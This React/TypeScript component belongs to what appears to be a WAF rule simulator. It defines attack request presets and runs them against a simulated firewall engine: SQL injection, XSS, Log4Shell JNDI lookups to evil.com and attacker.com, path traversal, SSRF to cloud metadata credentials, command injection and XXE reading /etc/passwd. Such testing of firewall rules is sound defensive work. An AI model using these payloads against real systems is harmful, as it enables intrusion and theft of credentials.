"use client";

import React, { useState } from "react";
import { useWAFSimStore } from "@/store/wafsimStore";
import { HttpRequest, HTTPMethod, HTTPProtocol, AttackPreset } from "@/lib/types";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import {
  Select, SelectContent, SelectItem, SelectTrigger, SelectValue,
} from "@/components/ui/select";
import { Badge } from "@/components/ui/badge";
import { Play, Plus, Trash2, Zap } from "lucide-react";
import { evaluateWebACL, evaluateBatch } from "@/engines/wafEngine";

const ATTACK_PRESETS: AttackPreset[] = [
  { id: "sqli-basic", name: "SQL Injection (Basic)", description: "' OR '1'='1 in query param", category: "sqli", request: { method: "GET", uri: "/api/users?id=1' OR '1'='1", sourceIP: "192.168.1.100", country: "US" } },
  { id: "sqli-union", name: "UNION SQLi", description: "UNION SELECT injection", category: "sqli", request: { method: "GET", uri: "/search?q=' UNION SELECT * FROM users--", sourceIP: "192.168.1.100", country: "US" } },
  { id: "xss-script", name: "XSS Script Tag", description: "<script>alert() in body", category: "xss", request: { method: "POST", uri: "/comment", body: '<script>alert("XSS")</script>', headers: [{ name: "Content-Type", value: "application/x-www-form-urlencoded" }], sourceIP: "192.168.1.100", country: "US" } },
  { id: "xss-event", name: "XSS Event Handler", description: "onerror handler injection", category: "xss", request: { method: "POST", uri: "/profile", body: '<img src=x onerror=alert(1)>', sourceIP: "192.168.1.100", country: "US" } },
  { id: "log4shell", name: "Log4Shell (CVE-2021-44228)", description: "JNDI lookup in headers", category: "rce", request: { method: "GET", uri: "/", headers: [{ name: "X-Api-Version", value: "${jndi:ldap://evil.com/x}" }, { name: "User-Agent", value: "${jndi:ldap://attacker.com/a}" }], sourceIP: "192.168.1.100", country: "US" } },
  { id: "path-traversal", name: "Path Traversal", description: "../../etc/passwd", category: "traversal", request: { method: "GET", uri: "/files?path=../../../etc/passwd", sourceIP: "192.168.1.100", country: "US" } },
  { id: "bot-sqlmap", name: "SQLMap Bot", description: "Automated SQLi tool UA", category: "bot", request: { method: "GET", uri: "/products?id=1", headers: [{ name: "User-Agent", value: "sqlmap/1.5.2#stable (https://sqlmap.org)" }], sourceIP: "10.0.0.50", country: "RU" } },
  { id: "admin-access", name: "Admin Panel Probe", description: "wp-admin access attempt", category: "auth", request: { method: "GET", uri: "/wp-admin/setup.php", sourceIP: "192.168.1.100", country: "CN" } },
  { id: "geo-block", name: "Geo-Restricted Request", description: "Request from blocked country", category: "other", request: { method: "GET", uri: "/api/data", sourceIP: "185.220.101.1", country: "RU" } },
  { id: "ssrf", name: "SSRF Attempt", description: "Server-side request forgery via URL param", category: "rce", request: { method: "GET", uri: "/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/", sourceIP: "192.168.1.100", country: "US" } },
  { id: "cmd-injection", name: "Command Injection", description: "OS command in query param", category: "rce", request: { method: "GET", uri: "/ping?host=127.0.0.1;cat /etc/passwd", sourceIP: "192.168.1.100", country: "US" } },
  { id: "xxe", name: "XXE Injection", description: "XML external entity in body", category: "rce", request: { method: "POST", uri: "/api/xml", body: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', headers: [{ name: "Content-Type", value: "application/xml" }], sourceIP: "192.168.1.100", country: "US" } },
  { id: "no-ua", name: "Missing User-Agent", description: "Request without User-Agent header", category: "bot", request: { method: "GET", uri: "/api/data", headers: [{ name: "Host", value: "example.com" }], sourceIP: "10.0.0.1", country: "US" } },
  { id: "oversized-body", name: "Oversized Body", description: "Body exceeds 8KB limit", category: "other", request: { method: "POST", uri: "/upload", body: "A".repeat(10000), headers: [{ name: "Content-Type", value: "application/octet-stream" }], sourceIP: "192.168.1.100", country: "US" } },
  { id: "legitimate", name: "Legitimate Request", description: "Normal GET request", category: "other", request: { method: "GET", uri: "/api/users", headers: [{ name: "User-Agent", value: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" }], sourceIP: "203.0.113.50", country: "US" } },
];

interface TrafficSimulatorProps {
  onSimulate?: () => void;
}

export const TrafficSimulator: React.FC<TrafficSimulatorProps> = ({ onSimulate }) => {
  const { currentRequest, setCurrentRequest, wafs, ipSets, regexPatternSets, setEvaluationResultWithWAF, setIsSimulating } = useWAFSimStore();
  const [activeSection, setActiveSection] = useState<"form" | "presets" | "batch" | "flood">("form");
  const [batchResults, setBatchResults] = useState<Array<{ name: string; category: string; action: string }> | null>(null);
  const [floodConfig, setFloodConfig] = useState({ rps: 50, duration: 60, sourceIPs: 1, uri: "/api/endpoint", method: "GET" as string });
  const [floodResults, setFloodResults] = useState<{ total: number; allowed: number; blocked: number; triggeredAt: number | null } | null>(null);

  const activeWAF = wafs.length > 0 ? wafs[0] : null;

  const applyPreset = (preset: AttackPreset) => {
    setCurrentRequest({
      protocol: preset.request.protocol || "HTTP/1.1",
      method: preset.request.method || "GET",
      uri: preset.request.uri || "/",
      queryParams: preset.request.queryParams || {},
      headers: preset.request.headers || [{ name: "Host", value: "example.com" }, { name: "User-Agent", value: "Mozilla/5.0" }],
      body: preset.request.body || "",
      bodyEncoding: preset.request.bodyEncoding || "none",
      contentType: preset.request.contentType || "application/json",
      sourceIP: preset.request.sourceIP || "192.168.1.100",
      country: preset.request.country || "US",
    });
    setActiveSection("form");
  };

  const runBatch = () => {
    if (!activeWAF) return;
    const results = ATTACK_PRESETS.map(p => {
      const req: HttpRequest = {
        protocol: "HTTP/1.1", method: p.request.method || "GET", uri: p.request.uri || "/",
        queryParams: {}, headers: p.request.headers || [{ name: "Host", value: "example.com" }],
        body: p.request.body || "", bodyEncoding: "none", contentType: "application/json",
        sourceIP: p.request.sourceIP || "192.168.1.100", country: p.request.country || "US",
      };
      return { name: p.name, category: p.category, action: evaluateWebACL(req, activeWAF, { ipSets, regexPatternSets }).finalAction };
    });
    setBatchResults(results);
  };

  const runFlood = () => {
    if (!activeWAF) return;
    const totalReqs = floodConfig.rps * floodConfig.duration;
    const reqsPerIP = Math.ceil(totalReqs / floodConfig.sourceIPs);
    const intervalMs = Math.max(1, Math.floor(1000 / floodConfig.rps));

    // Generate requests
    const requests: HttpRequest[] = [];
    for (let i = 0; i < Math.min(totalReqs, 2000); i++) { // Cap at 2000 for performance
      const ipIndex = i % floodConfig.sourceIPs;
      requests.push({
        protocol: "HTTP/1.1",
        method: floodConfig.method as any,
        uri: floodConfig.uri,
        queryParams: {},
        headers: [{ name: "Host", value: "example.com" }, { name: "User-Agent", value: "Mozilla/5.0" }],
        body: "",
        bodyEncoding: "none",
        contentType: "application/json",
        sourceIP: `192.168.1.${100 + ipIndex}`,
        country: "US",
      });
    }

    const results = evaluateBatch(requests, activeWAF, {
      ipSets, regexPatternSets,
      requestInterval: intervalMs,
    });

    let allowed = 0, blocked = 0, triggeredAt: number | null = null;
    results.forEach((r, i) => {
      if (r.finalAction === "BLOCK") {
        blocked++;
        if (triggeredAt === null) triggeredAt = i + 1;
      } else {
        allowed++;
      }
    });

    setFloodResults({ total: results.length, allowed, blocked, triggeredAt });
  };

  const addHeader = () => setCurrentRequest({ ...currentRequest, headers: [...(currentRequest.headers || []), { name: "", value: "" }] });
  const updateHeader = (i: number, f: "name" | "value", v: string) => {
    const h = [...(currentRequest.headers || [])]; h[i] = { ...h[i], [f]: v };
    setCurrentRequest({ ...currentRequest, headers: h });
  };
  const removeHeader = (i: number) => setCurrentRequest({ ...currentRequest, headers: (currentRequest.headers || []).filter((_, idx) => idx !== i) });

  return (
    <div className="h-full flex flex-col text-white text-xs">
      {/* Horizontal tabs */}
      <div className="flex items-center gap-0.5 px-3 py-1.5 border-b border-gray-800 bg-gray-900/50 shrink-0">
        {([["form", "Request"], ["presets", "Presets"], ["batch", "Batch"], ["flood", "Flood"]] as const).map(([key, label]) => (
          <button key={key} onClick={() => setActiveSection(key)}
            className={`px-2.5 py-1 rounded text-[11px] transition-colors ${activeSection === key ? "bg-gray-700 text-white font-medium" : "text-gray-500 hover:text-gray-300"}`}>
            {label}
          </button>
        ))}
      </div>

      {/* Content */}
      <div className="flex-1 overflow-y-auto p-3 min-w-0">
        {activeSection === "form" && (
          <div className="grid grid-cols-[auto_1fr_1fr] gap-x-3 gap-y-1.5">
            {/* Col 1: Method, Protocol, IP, Country */}
            <div className="space-y-1.5">
              <div>
                <Label className="text-[10px] text-gray-500 uppercase tracking-wider">Method</Label>
                <Select value={currentRequest.method} onValueChange={(v: HTTPMethod) => setCurrentRequest({ ...currentRequest, method: v })}>
                  <SelectTrigger className="bg-gray-800 border-gray-700 h-7 text-xs w-24"><SelectValue /></SelectTrigger>
                  <SelectContent>
                    {(["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"] as const).map(m => <SelectItem key={m} value={m}>{m}</SelectItem>)}
                  </SelectContent>
                </Select>
              </div>
              <div className="flex gap-2">
                <div className="flex-1">
                  <Label className="text-[10px] text-gray-500 uppercase tracking-wider">Source IP</Label>
                  <Input value={currentRequest.sourceIP} onChange={e => setCurrentRequest({ ...currentRequest, sourceIP: e.target.value })} className="bg-gray-800 border-gray-700 h-7 text-xs font-mono" />
                </div>
                <div className="w-12">
                  <Label className="text-[10px] text-gray-500 uppercase tracking-wider">CC</Label>
                  <Input value={currentRequest.country} onChange={e => setCurrentRequest({ ...currentRequest, country: e.target.value })} maxLength={2} className="bg-gray-800 border-gray-700 h-7 text-xs uppercase" />
                </div>
              </div>
            </div>

            {/* Col 2: URI + Body */}
            <div className="space-y-1.5">
              <div>
                <Label className="text-[10px] text-gray-500 uppercase tracking-wider">URI Path</Label>
                <Input value={currentRequest.uri} onChange={e => setCurrentRequest({ ...currentRequest, uri: e.target.value })} className="bg-gray-800 border-gray-700 h-7 text-xs font-mono" />
              </div>
              <div>
                <Label className="text-[10px] text-gray-500 uppercase tracking-wider">Body</Label>
                <Textarea value={currentRequest.body} onChange={e => setCurrentRequest({ ...currentRequest, body: e.target.value })}
                  className="bg-gray-800 border-gray-700 text-xs font-mono min-h-[60px] max-h-[100px] resize-none" placeholder='{"key":"value"}' />
              </div>
            </div>

            {/* Col 3: Headers */}
            <div>
              <div className="flex items-center justify-between">
                <Label className="text-[10px] text-gray-500 uppercase tracking-wider">Headers</Label>
                <Button size="sm" variant="ghost" onClick={addHeader} className="h-5 text-[10px] text-gray-500 px-1 hover:text-gray-300"><Plus className="w-3 h-3" /></Button>
              </div>
              <div className="space-y-0.5 max-h-[120px] overflow-y-auto mt-0.5">
                {(currentRequest.headers || []).map((h, i) => (
                  <div key={i} className="flex gap-0.5 items-center">
                    <Input value={h.name} onChange={e => updateHeader(i, "name", e.target.value)} placeholder="Name" className="bg-gray-800 border-gray-700 h-6 text-[10px] flex-1 font-mono px-1.5" />
                    <Input value={h.value} onChange={e => updateHeader(i, "value", e.target.value)} placeholder="Value" className="bg-gray-800 border-gray-700 h-6 text-[10px] flex-[2] font-mono px-1.5" />
                    <button onClick={() => removeHeader(i)} className="text-gray-600 hover:text-red-400 shrink-0"><Trash2 className="w-2.5 h-2.5" /></button>
                  </div>
                ))}
              </div>
            </div>
          </div>
        )}

        {activeSection === "presets" && (
          <div className="grid grid-cols-3 gap-1">
            {ATTACK_PRESETS.map(p => (
              <button key={p.id} onClick={() => applyPreset(p)}
                className="text-left px-2 py-1.5 rounded bg-gray-800/50 hover:bg-gray-800 border border-gray-700/50 hover:border-gray-600 transition-colors">
                <div className="flex items-center gap-1">
                  <Badge variant="outline" className="text-[8px] px-0.5 shrink-0">{p.category}</Badge>
                  <span className="font-medium text-[10px] truncate">{p.name}</span>
                </div>
                <p className="text-[9px] text-gray-500 truncate">{p.description}</p>
              </button>
            ))}
          </div>
        )}

        {activeSection === "batch" && (
          <div>
            <div className="flex items-center gap-2 mb-2">
              <p className="text-[11px] text-gray-400 flex-1">Run all {ATTACK_PRESETS.length} presets against your WAF.</p>
              <Button onClick={runBatch} disabled={!activeWAF} size="sm" className="bg-purple-600 hover:bg-purple-700 h-7 text-xs shrink-0">
                <Zap className="w-3 h-3 mr-1" />Run All
              </Button>
            </div>
            {batchResults && (
              <div className="space-y-0.5">
                <div className="flex gap-3 mb-1.5 text-[10px] font-medium">
                  <span className="text-red-400">Blocked: {batchResults.filter(r => r.action === "BLOCK").length}</span>
                  <span className="text-green-400">Allowed: {batchResults.filter(r => r.action === "ALLOW").length}</span>
                  <span className="text-yellow-400">Counted: {batchResults.filter(r => r.action === "COUNT").length}</span>
                </div>
                {batchResults.map((r, i) => (
                  <div key={i} className="flex items-center justify-between px-2 py-0.5 rounded hover:bg-gray-800/50">
                    <div className="flex items-center gap-1.5 min-w-0">
                      <Badge variant="outline" className="text-[8px] px-0.5 shrink-0">{r.category}</Badge>
                      <span className="truncate text-[11px]">{r.name}</span>
                    </div>
                    <Badge className={`shrink-0 text-[8px] px-1 ${r.action === "BLOCK" ? "bg-red-600" : r.action === "COUNT" ? "bg-yellow-600" : "bg-green-600"}`}>{r.action}</Badge>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}
        {activeSection === "flood" && (
          <div className="space-y-2">
            <div className="flex items-center gap-2">
              <Badge variant="outline" className="text-[9px] text-yellow-500 border-yellow-600 shrink-0">In Development</Badge>
              <p className="text-[11px] text-gray-400">Simulate volumetric attacks and rate-based rules.</p>
            </div>
            <div className="grid grid-cols-5 gap-2">
              <div>
                <Label className="text-[10px] text-gray-500 uppercase tracking-wider">Req/sec</Label>
                <Input type="number" value={floodConfig.rps} onChange={e => setFloodConfig({...floodConfig, rps: parseInt(e.target.value) || 1})} className="bg-gray-800 border-gray-700 h-7 text-xs" />
              </div>
              <div>
                <Label className="text-[10px] text-gray-500 uppercase tracking-wider">Duration</Label>
                <Input type="number" value={floodConfig.duration} onChange={e => setFloodConfig({...floodConfig, duration: parseInt(e.target.value) || 1})} className="bg-gray-800 border-gray-700 h-7 text-xs" />
              </div>
              <div>
                <Label className="text-[10px] text-gray-500 uppercase tracking-wider">IPs</Label>
                <Input type="number" value={floodConfig.sourceIPs} onChange={e => setFloodConfig({...floodConfig, sourceIPs: parseInt(e.target.value) || 1})} min={1} max={100} className="bg-gray-800 border-gray-700 h-7 text-xs" />
              </div>
              <div>
                <Label className="text-[10px] text-gray-500 uppercase tracking-wider">URI</Label>
                <Input value={floodConfig.uri} onChange={e => setFloodConfig({...floodConfig, uri: e.target.value})} className="bg-gray-800 border-gray-700 h-7 text-xs font-mono" />
              </div>
              <div>
                <Label className="text-[10px] text-gray-500 uppercase tracking-wider">Method</Label>
                <Select value={floodConfig.method} onValueChange={v => setFloodConfig({...floodConfig, method: v})}>
                  <SelectTrigger className="bg-gray-800 border-gray-700 h-7 text-xs"><SelectValue /></SelectTrigger>
                  <SelectContent>
                    {["GET","POST","PUT","DELETE"].map(m => <SelectItem key={m} value={m}>{m}</SelectItem>)}
                  </SelectContent>
                </Select>
              </div>
            </div>
            <div className="flex items-center gap-3">
              <Button onClick={runFlood} disabled={!activeWAF} size="sm" className="bg-orange-600 hover:bg-orange-700 h-7 text-xs">
                Run Flood
              </Button>
              <span className="text-[10px] text-gray-500">
                {floodConfig.rps * floodConfig.duration} total reqs from {floodConfig.sourceIPs} IP{floodConfig.sourceIPs > 1 ? "s" : ""} · {Math.ceil((floodConfig.rps / floodConfig.sourceIPs) * 300)}/5min per IP
              </span>
            </div>
            {floodResults && (
              <div className="flex items-center gap-3 text-[11px] bg-gray-800 rounded px-2 py-1.5">
                <span className="text-green-400">Allowed: {floodResults.allowed}</span>
                <span className="text-red-400">Blocked: {floodResults.blocked}</span>
                <span className="text-gray-500">/ {floodResults.total}</span>
                {floodResults.triggeredAt !== null ? (
                  <span className="text-orange-400 ml-auto">Rate limit @ req #{floodResults.triggeredAt}</span>
                ) : (
                  <span className="text-gray-600 ml-auto">Not triggered</span>
                )}
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
};

export default TrafficSimulator;
